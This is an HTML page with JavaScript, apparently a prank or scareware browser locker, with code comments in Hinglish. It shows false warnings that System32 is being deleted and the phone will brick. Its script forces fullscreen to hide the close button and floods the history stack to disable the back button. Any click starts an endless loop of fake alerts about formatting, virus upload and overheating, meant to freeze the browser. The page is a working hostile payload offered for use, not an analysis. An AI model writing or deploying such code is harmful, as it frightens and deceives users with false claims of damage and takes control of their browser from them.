<!DOCTYPE html>
<html>
<head>
    <title>🚨 SYSTEM FAILURE 🚨</title>
</head>
<body style="background-color: black; color: red; text-align: center; font-family: courier;">
    <h1 id="status">DELETING SYSTEM32...</h1>
    <p>DO NOT CLOSE THIS WINDOW OR PHONE WILL BRICK</p>

    <script>
        // 1. Full Screen Force (Isse 'X' button chup jata hai)
        function requestFullScreen() {
            var el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();
            else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
            else if (el.msRequestFullscreen) el.msRequestFullscreen();
        }

        // 2. History Spam (Isse 'Back' button kaam nahi karega)
        for (var i = 0; i < 100; i++) {
            window.history.pushState(null, "", window.location.href);
        }
        window.onpopstate = function() {
            window.history.pushState(null, "", window.location.href);
            alert("⚠️ ERROR: Security Breach! Access Denied.");
        };

        // 3. The Infinite Memory Hogger
        function startFreeze() {
            requestFullScreen();
            // Naya alert aate hi purana loop restart hoga
            while(true) {
                alert("🔴 CRITICAL ERROR: Storage sector 0x889 formatted.");
                alert("💀 VIRUS STATUS: 99% Uploaded.");
                alert("📱 DEVICE STATUS: Overheating...");
                alert("😂 VELOCITA: Browser is now locked!");
            }
        }

        // Jab user screen par kahin bhi click karega, full screen active ho jayega
        document.onclick = function() {
            startFreeze();
        }
        
        window.onload = function() {
            setTimeout(function() {
                alert("CLICK 'OK' TO REPAIR SYSTEM");
            }, 1000);
        }
    </script>
</body>
</html>
